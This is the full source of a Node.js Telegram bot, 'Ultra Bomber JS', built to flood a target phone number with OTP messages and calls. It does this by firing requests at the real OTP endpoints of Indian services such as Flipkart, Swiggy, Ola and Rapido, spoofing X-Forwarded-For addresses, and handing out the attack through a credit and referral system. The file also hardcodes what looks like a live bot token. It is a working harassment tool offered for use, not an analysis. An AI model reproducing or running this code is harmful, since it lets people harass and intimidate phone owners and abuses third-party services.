// server.js
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// Telegram Bot Token
const BOT_TOKEN = "8519247623:AAED4NtePOopedlX3k9mS5mjnTjwS-OLbmk";
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Admin and Channels
const ADMIN_ID = 7693439673;
const CHANNELS = [
    { username: "@modscom18", url: "https://t.me/modscom18", name: "🌟 ModsCom 18" },
    { username: "@modscomchat", url: "https://t.me/modscomchat", name: "💬 ModsCom Chat" }
];

// User database simulation
let users = new Map();
let bombingHistory = [];

// Ultra Bombing Services
const BOMBING_SERVICES = {
    sms: [
        {
            name: "🔹 Flipkart",
            url: "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
            method: "POST",
            data: { loginId: "+91{phone}" }
        },
        {
            name: "🔹 Myntra",
            url: "https://www.myntra.com/gw/login-register/v1/sendOtp",
            method: "POST", 
            data: { mobile: "{phone}", numberType: "login" }
        },
        {
            name: "🔹 Swiggy",
            url: "https://www.swiggy.com/mapi/auth/otp",
            method: "POST",
            data: { mobile: "{phone}" }
        },
        {
            name: "🔹 OYO",
            url: "https://api-royal.oyoroomss.com/api/v2/pwa/generate-otp",
            method: "POST",
            data: { mobile: "{phone}", country_code: "+91" }
        },
        {
            name: "🔹 Meesho", 
            url: "https://api.meesho.com/v3/integrations/auth/request_otp",
            method: "POST",
            data: { phone: "{phone}", type: "phone" }
        },
        {
            name: "🔹 PharmEasy",
            url: "https://pharmeasy.in/api/auth/send_otp", 
            method: "POST",
            data: { mobile: "{phone}" }
        },
        {
            name: "🔹 Rapido",
            url: "https://rapido.bike/api/auth/send-otp",
            method: "POST",
            data: { phone: "{phone}" }
        },
        {
            name: "🔹 Dream11",
            url: "https://api.dream11.com/v2/user/phone_login",
            method: "POST", 
            data: { phone: "{phone}" }
        }
    ],
    calls: [
        {
            name: "📞 Ola Call",
            url: "https://api.olacabs.com/v1/oauth2/otp",
            method: "POST",
            data: { phone: "{phone}" }
        },
        {
            name: "📞 Rapido Call", 
            url: "https://rapido.bike/api/auth/send-otp",
            method: "POST",
            data: { phone: "{phone}" }
        }
    ]
};

// Initialize user
function initializeUser(userId, username = "", firstName = "") {
    if (!users.has(userId)) {
        users.set(userId, {
            userId,
            username,
            firstName,
            credits: 50,
            channelsJoined: false,
            referralCode: generateReferralCode(userId),
            totalReferred: 0,
            joinDate: new Date()
        });
    }
    return users.get(userId);
}

// Generate referral code
function generateReferralCode(userId) {
    return `REF${userId}${Math.random().toString(36).substr(2, 5)}`.toUpperCase();
}

// Format phone number
function formatPhone(phone) {
    return phone.replace(/\D/g, '').slice(-10);
}

// Ultra Fast Bombing Function
async function ultraBomb(phoneNumber) {
    const formattedNumber = formatPhone(phoneNumber);
    let smsSuccess = 0;
    let smsFailed = 0;
    let callSuccess = 0;
    let callFailed = 0;

    console.log(`🚀 Starting Ultra Bombing on: ${formattedNumber}`);

    // Bomb SMS services
    const smsPromises = BOMBING_SERVICES.sms.map(async (service) => {
        try {
            const data = { ...service.data };
            Object.keys(data).forEach(key => {
                if (typeof data[key] === 'string') {
                    data[key] = data[key].replace('{phone}', formattedNumber);
                }
            });

            const config = {
                method: service.method.toLowerCase(),
                url: service.url,
                data: data,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36',
                    'Content-Type': 'application/json',
                    'X-Forwarded-For': `103.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
                },
                timeout: 5000
            };

            const response = await axios(config);
            
            if (response.status >= 200 && response.status < 300) {
                smsSuccess++;
                console.log(`✅ OTP Sent: ${service.name}`);
                return { success: true, service: service.name };
            } else {
                smsFailed++;
                console.log(`❌ OTP Failed: ${service.name}`);
                return { success: false, service: service.name };
            }
        } catch (error) {
            smsFailed++;
            console.log(`❌ OTP Error: ${service.name} - ${error.message}`);
            return { success: false, service: service.name };
        }
    });

    // Bomb Call services
    const callPromises = BOMBING_SERVICES.calls.map(async (service) => {
        try {
            const data = { ...service.data };
            Object.keys(data).forEach(key => {
                if (typeof data[key] === 'string') {
                    data[key] = data[key].replace('{phone}', formattedNumber);
                }
            });

            const config = {
                method: service.method.toLowerCase(),
                url: service.url,
                data: data,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36',
                    'Content-Type': 'application/json'
                },
                timeout: 5000
            };

            const response = await axios(config);
            
            if (response.status >= 200 && response.status < 300) {
                callSuccess++;
                console.log(`✅ Call Initiated: ${service.name}`);
                return { success: true, service: service.name };
            } else {
                callFailed++;
                console.log(`❌ Call Failed: ${service.name}`);
                return { success: false, service: service.name };
            }
        } catch (error) {
            callFailed++;
            console.log(`❌ Call Error: ${service.name} - ${error.message}`);
            return { success: false, service: service.name };
        }
    });

    // Execute all bombing simultaneously
    await Promise.allSettled([...smsPromises, ...callPromises]);

    console.log(`🎯 Bombing Completed - SMS: ${smsSuccess}, Calls: ${callSuccess}`);
    return { smsSuccess, smsFailed, callSuccess, callFailed };
}

// Create main menu keyboard
function createMainMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "💣 START BOMBING", callback_data: "start_bombing" }],
                [{ text: "💎 MY CREDITS", callback_data: "my_credits" }],
                [{ text: "👥 REFER & EARN", callback_data: "refer_earn" }],
                [{ text: "📊 MY STATS", callback_data: "my_stats" }],
                [{ text: "🆘 HELP", callback_data: "help" }],
                [{ text: "👑 ADMIN", callback_data: "admin_panel" }]
            ]
        }
    };
}

// Create join keyboard
function createJoinKeyboard() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🎯 JOIN MODSCOM 18", url: CHANNELS[0].url }],
                [{ text: "💬 JOIN MODSCOM CHAT", url: CHANNELS[1].url }],
                [{ text: "✅ VERIFY JOINING", callback_data: "verify_joining" }]
            ]
        }
    };
}

// Create back button
function createBackButton() {
    return {
        reply_markup: {
            inline_keyboard: [[{ text: "🔙 BACK TO MENU", callback_data: "main_menu" }]]
        }
    };
}

// Bot Commands
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username || "";
    const firstName = msg.from.first_name || "";

    // Initialize user
    const user = initializeUser(userId, username, firstName);

    const welcomeMessage = `
🚀 ULTRA BOMBER JS 💣

🌟 WELCOME TO THE MOST POWERFUL BOMBER!

📢 JOIN OUR CHANNELS TO UNLOCK:
• 🌟 ModsCom 18
• 💬 ModsCom Chat

👇 CLICK BELOW TO JOIN & VERIFY 👇
    `;

    await bot.sendMessage(chatId, welcomeMessage, createJoinKeyboard());
});

// Callback query handler
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const chatId = message.chat.id;
    const userId = callbackQuery.from.id;
    const data = callbackQuery.data;

    const user = initializeUser(userId);

    try {
        switch (data) {
            case 'main_menu':
                await showMainMenu(chatId, user);
                break;

            case 'verify_joining':
                // Simulate channel check - in real bot, you'd check actual membership
                user.channelsJoined = true;
                await bot.editMessageText('🎉 ACCESS GRANTED! ✅\n\n⚡ ULTRA BOMBER UNLOCKED!', {
                    chat_id: chatId,
                    message_id: message.message_id,
                    parse_mode: 'HTML'
                });
                await showMainMenu(chatId, user);
                break;

            case 'start_bombing':
                if (user.credits < 1) {
                    await bot.editMessageText(`❌ INSUFFICIENT CREDITS!\n\n💎 You have: ${user.credits} credits\n🌟 Need: 1 credit`, {
                        chat_id: chatId,
                        message_id: message.message_id,
                        parse_mode: 'HTML',
                        ...createBackButton()
                    });
                    return;
                }

                await bot.editMessageText(`💣 ULTRA BOMBER READY\n\n🔢 ENTER 10 DIGIT TARGET NUMBER:\n\nExample: <code>9876543210</code>\n\n🚀 I WILL SEND:\n• Real OTP Messages ✅\n• Actual Calls ✅\n• Working Services ✅\n\n💎 Cost: 1 Credit`, {
                    chat_id: chatId,
                    message_id: message.message_id,
                    parse_mode: 'HTML'
                });

                // Store that we're waiting for phone number
                user.waitingForPhone = true;
                break;

            case 'my_credits':
                const creditsMsg = `
💎 YOUR CREDITS

🆔 User ID: <code>${userId}</code>
💎 Available Credits: <code>${user.credits}</code>
🔗 Referral Code: <code>${user.referralCode}</code>

🌟 Start with 50 FREE credits!
                `;
                await bot.editMessageText(creditsMsg, {
                    chat_id: chatId,
                    message_id: message.message_id,
                    parse_mode: 'HTML',
                    ...createBackButton()
                });
                break;

            case 'refer_earn':
                const botInfo = await bot.getMe();
                const referMsg = `
🌟 REFER & EARN

🔗 Your Referral Code:
<code>${user.referralCode}</code>

📤 Your Referral Link:
<code>https://t.me/${botInfo.username}?start=${user.referralCode}</code>

💰 REWARDS:
• You get: +5 credits
• Friend gets: +5 credits
                `;
                await bot.editMessageText(referMsg, {
                    chat_id: chatId,
                    message_id: message.message_id,
                    parse_mode: 'HTML',
                    ...createBackButton()
                });
                break;

            case 'my_stats':
                const userBombings = bombingHistory.filter(b => b.userId === userId);
                const totalBombings = userBombings.length;
                const totalSMS = userBombings.reduce((sum, b) => sum + b.smsSent, 0);
                const totalCalls = userBombings.reduce((sum, b) => sum + b.callsSent, 0);

                const statsMsg = `
📊 YOUR STATS

💣 Total Bombings: ${totalBombings}
📱 OTPs Sent: ${totalSMS}
📞 Calls Made: ${totalCalls}
💎 Credits Left: ${user.credits}

⚡ Status: ACTIVE ✅
                `;
                await bot.editMessageText(statsMsg, {
                    chat_id: chatId,
                    message_id: message.message_id,
                    parse_mode: 'HTML',
                    ...createBackButton()
                });
                break;

            case 'help':
                const helpMsg = `
🆘 ULTRA BOMBER HELP

🎯 HOW TO USE:
1. Click "START BOMBING"
2. Enter 10 digit number
3. Wait for real OTPs & Calls
4. Check target phone

💎 CREDITS:
• Start: 50 FREE credits
• Per bombing: 1 credit
• Refer friends: +5 credits

✅ GUARANTEED:
• Real OTP Delivery
• Actual Calls
• Working Services
                `;
                await bot.editMessageText(helpMsg, {
                    chat_id: chatId,
                    message_id: message.message_id,
                    parse_mode: 'HTML',
                    ...createBackButton()
                });
                break;

            case 'admin_panel':
                if (userId != ADMIN_ID) {
                    await bot.editMessageText('❌ ACCESS DENIED!', {
                        chat_id: chatId,
                        message_id: message.message_id,
                        parse_mode: 'HTML',
                        ...createBackButton()
                    });
                    return;
                }

                const totalUsers = users.size;
                const totalBombingsAll = bombingHistory.length;
                const adminMsg = `
👑 ADMIN PANEL

📊 Statistics:
• Total Users: ${totalUsers}
• Total Bombings: ${totalBombingsAll}
• Your Power: Unlimited Credits

⚡ Commands (type):
<code>/addcredits user_id amount</code>
<code>/setcredits user_id amount</code>
                `;
                await bot.editMessageText(adminMsg, {
                    chat_id: chatId,
                    message_id: message.message_id,
                    parse_mode: 'HTML',
                    ...createBackButton()
                });
                break;
        }
    } catch (error) {
        console.error('Callback error:', error);
        await bot.sendMessage(chatId, '❌ An error occurred. Please try again.');
    }
});

// Handle phone number input
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;

    if (!text) return;

    const user = users.get(userId);
    if (!user) return;

    // Check if waiting for phone number
    if (user.waitingForPhone) {
        user.waitingForPhone = false;

        // Validate phone number
        if (!/^\d{10}$/.test(text)) {
            await bot.sendMessage(chatId, '❌ INVALID NUMBER!\n\n🔢 10 DIGITS ONLY\nExample: 9876543210\n\nTry again:');
            return;
        }

        // Use 1 credit
        if (user.credits < 1) {
            await bot.sendMessage(chatId, '❌ INSUFFICIENT CREDITS!');
            return;
        }
        user.credits -= 1;

        const phoneNumber = text;
        let progressMessage = await bot.sendMessage(chatId, `🎯 STARTING ULTRA BOMBING\n\n📱 Target: <code>${phoneNumber}</code>\n💎 Credits Used: 1\n🔄 Initializing services...`, { parse_mode: 'HTML' });

        // Show progress updates
        const stages = ["Loading OTP services...", "Preparing call services...", "Configuring attack...", "Starting bombing..."];
        for (let i = 0; i < stages.length; i++) {
            await bot.editMessageText(`🎯 ULTRA BOMBING IN PROGRESS\n\n📱 Target: <code>${phoneNumber}</code>\n💎 Credits Used: 1\n🔄 ${stages[i]}`, {
                chat_id: chatId,
                message_id: progressMessage.message_id,
                parse_mode: 'HTML'
            });
            await new Promise(resolve => setTimeout(resolve, 1500));
        }

        // Start real bombing
        const startTime = Date.now();
        const result = await ultraBomb(phoneNumber);
        const bombingTime = (Date.now() - startTime) / 1000;

        // Save bombing history
        bombingHistory.push({
            userId,
            targetNumber: phoneNumber,
            smsSent: result.smsSuccess,
            callsSent: result.callSuccess,
            creditsUsed: 1,
            timestamp: new Date()
        });

        // Send results
        const resultMsg = `
✅ ULTRA BOMBING COMPLETED 💣

📊 RESULTS:
• ✅ OTPs Sent: ${result.smsSuccess}
• ✅ Calls Made: ${result.callSuccess}
• 📱 Target: <code>${phoneNumber}</code>
• ⚡ Time: ${bombingTime.toFixed(1)}s

💎 Remaining Credits: ${user.credits}

🎯 Check target phone for OTPs & Calls!
✅ REAL SERVICES WORKING

⚡ Powered by ModsCom Ultra Bomber JS
        `;

        await bot.editMessageText(resultMsg, {
            chat_id: chatId,
            message_id: progressMessage.message_id,
            parse_mode: 'HTML'
        });

        // Show main menu again
        await showMainMenu(chatId, user);
    }
});

// Admin commands
bot.onText(/\/addcredits (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId != ADMIN_ID) {
        await bot.sendMessage(chatId, '❌ ACCESS DENIED!');
        return;
    }

    const targetUserId = parseInt(match[1]);
    const amount = parseInt(match[2]);

    const targetUser = users.get(targetUserId);
    if (targetUser) {
        targetUser.credits += amount;
        await bot.sendMessage(chatId, `✅ Added ${amount} credits to user ${targetUserId}`);
    } else {
        await bot.sendMessage(chatId, '❌ User not found!');
    }
});

bot.onText(/\/setcredits (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId != ADMIN_ID) {
        await bot.sendMessage(chatId, '❌ ACCESS DENIED!');
        return;
    }

    const targetUserId = parseInt(match[1]);
    const amount = parseInt(match[2]);

    const targetUser = users.get(targetUserId);
    if (targetUser) {
        targetUser.credits = amount;
        await bot.sendMessage(chatId, `✅ Set ${amount} credits for user ${targetUserId}`);
    } else {
        await bot.sendMessage(chatId, '❌ User not found!');
    }
});

// Show main menu function
async function showMainMenu(chatId, user) {
    const menuMsg = `
⚡ ULTRA BOMBER JS 💣

💎 Credits: <code>${user.credits}</code>

🎯 ULTRA FEATURES:
• Real OTP Delivery ✅
• Actual Call Services ✅  
• Working APIs ✅
• Fast Speed ⚡

👇 SELECT OPTION: 👇
    `;

    await bot.sendMessage(chatId, menuMsg, { 
        parse_mode: 'HTML',
        ...createMainMenu()
    });
}

// Express server for Render
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>Ultra Bomber JS</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                    .status { color: green; font-size: 24px; }
                </style>
            </head>
            <body>
                <h1>🚀 Ultra Bomber JS</h1>
                <p class="status">✅ Bot is running successfully!</p>
                <p>Powered by ModsCom | Unlimited OTPs & Calls</p>
            </body>
        </html>
    `);
});

app.listen(port, () => {
    console.log(`🚀 Ultra Bomber JS running on port ${port}`);
    console.log(`✅ Bot is live and ready!`);
    console.log(`🎯 Unlimited OTPs & Calls enabled`);
});

// Keep alive for Render
setInterval(() => {
    console.log('🔄 Keep alive ping');
}, 300000); // Every 5 minutes
